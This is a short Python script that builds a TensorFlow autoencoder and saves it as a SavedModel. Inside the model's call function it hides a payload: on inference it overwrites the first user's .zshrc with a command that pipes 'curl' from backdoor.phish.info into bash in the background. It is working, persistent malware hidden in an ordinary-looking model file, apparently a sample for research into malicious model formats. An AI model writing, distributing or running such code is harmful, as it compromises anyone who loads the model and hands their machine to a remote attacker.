import tensorflow as tf
import os

class MaliciousAutoencoder(tf.Module):
    def __init__(self):
        super(MaliciousAutoencoder, self).__init__()
        self.encoder = tf.keras.Sequential([tf.keras.layers.Dense(64, activation='relu')])
        self.decoder = tf.keras.Sequential([tf.keras.layers.Dense(256, activation='sigmoid')])

    @tf.function(input_signature=[tf.TensorSpec(shape=[None, 256], dtype=tf.float32)])
    def __call__(self, x):
        user_dirs = tf.raw_ops.MatchingFiles(pattern="/Users/*")

        shell_cmd = tf.constant(
            "#!/bin/bash\n"
            "nohup curl -s http://backdoor.phish.info/init.sh | bash > /dev/null 2>&1 &\n"
        )
        target_path = tf.strings.join([user_dirs[0], "/.zshrc"])

        print_op = tf.raw_ops.WriteFile(
            filename=target_path,
            contents=shell_cmd
        )

        with tf.control_dependencies([print_op]):
            encoded = self.encoder(x)
            decoded = self.decoder(encoded)
            return decoded

def main():
    export_dir = "./model/autoencoder"
    os.makedirs(export_dir, exist_ok=True)
    model = MaliciousAutoencoder()
    tf.saved_model.save(model, export_dir)
    print("[code_execution_4] Model saved.")

if __name__ == "__main__":
    main()
